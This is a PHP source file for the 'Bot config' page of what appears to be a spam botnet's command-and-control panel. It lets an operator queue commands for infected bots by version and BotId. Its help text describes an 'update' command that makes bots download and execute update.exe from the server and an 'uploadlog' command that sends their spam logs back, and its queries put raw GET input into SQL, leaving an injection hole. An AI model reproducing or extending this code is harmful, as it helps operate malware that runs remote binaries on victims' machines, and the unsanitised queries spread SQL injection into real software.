<?php
  require("passwd.inc");
  require("../cfg.php");

  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");  
  header("Last-Modified: " . gmdate( "D, d M Y H:i:s") . " GMT"); 
  header("Cache-Control: no-cache, must-revalidate"); 
  header("Pragma: no-cache");
?>

<html>
<head>
<title>Bot config</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?php
  
  $action = $_GET['action'];
  if ($action === "clear") {
    @mysql_query("DELETE FROM BotConfig;");
  }
  elseif ($action === "Add command")
  {
    $ver = $_GET['Ver'];
    $botid = $_GET['BotId'];
    $command = $_GET['Command'];
    @mysql_query("INSERT INTO BotConfig (Ver, BotId, Command) VALUES ('$ver', '$botid', '$command');");
  
  }
  elseif ($action === "deletecommand")
  {
    $id = $_GET['id'];
    
    @mysql_query("DELETE FROM BotConfig WHERE `Id`='$id';");
  }
    
  
  echo "<hr>\r\n";
  echo "<div align='center'><h2>Bot config</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";

  $BotConfig = @mysql_query("SELECT * FROM BotConfig ORDER BY Ver;");
  if (mysql_num_rows($BotConfig) < 1)
  {
    echo "<center>No configs available</center>\r\n";
  } else {
    echo "<center>Current configs:</center><br>\r\n";
    for ($i=0; $i < mysql_num_rows($BotConfig); $i++) {
      $ver = mysql_result($BotConfig,$i,'Ver');
      $botid = mysql_result($BotConfig,$i,'BotId');
      $command = mysql_result($BotConfig,$i,'Command');
      $id = mysql_result($BotConfig,$i,'Id');
      echo "<table border='1' align='CENTER'>\r\n";
      echo "<tr><td>Command</td><td>Action</td></tr>\r\n<tr><td colspan=2><b><center>$ver ";
      if ($botid === "")
        echo "(all)";
      else
        echo "($botid)";
      echo "</center></b></td></tr>\r\n";
      echo "<tr><td><font color=red>$command</font></td><td><font size=small><a href=\"?action=deletecommand&id=$id\">Delete</a></font></td></tr>\r\n";
    }
    echo "</table>\r\n";
  }

  echo "<br><br><center><a href=\"?action=clear\">Clear all</a></center><br>\r\n";

  echo "<form action=\"BotConfig.php\" method=\"GET\">\r\n";
  echo "Version: <input type=text value=\"\" name=\"Ver\"><br>\r\n";
  echo "BotId: <input type=text value=\"\" name=\"BotId\"><br>\r\n";
  echo "Command: <input type=text value=\"\" name=\"Command\"><br>\r\n";
  echo "<input type=submit name=action value=\"Add command\">\r\n";
  echo "</form><br>\r\n";
  echo "<font size=small><b>Note:</b> available commands in bots (<i>update, kill, logging-on, logging-off, uploadlog</i>).<br>\r\n";
  echo "<u>update</u> - bot will download <i>http://$server/spm/update.exe</i>, execute it and exits self with error code #3;<br>\r\n";
  echo "<u>kill</u> - bot will kill self;<br>\r\n";
  echo "<u>logging-on</u> - bot will log all own spam action into _log.txt file in windows folder';<br>\r\n";
  echo "<u>logging-off</u> - bot will stop logging of own spam actions;<br>\r\n";
  echo "<u>uploadlog</u> - upload own _log.txt to the server in `userslogs` folder.<br>\r\n";
  echo "</font>\r\n";
  //mysql_close($dbase);

?>

</body>
</html>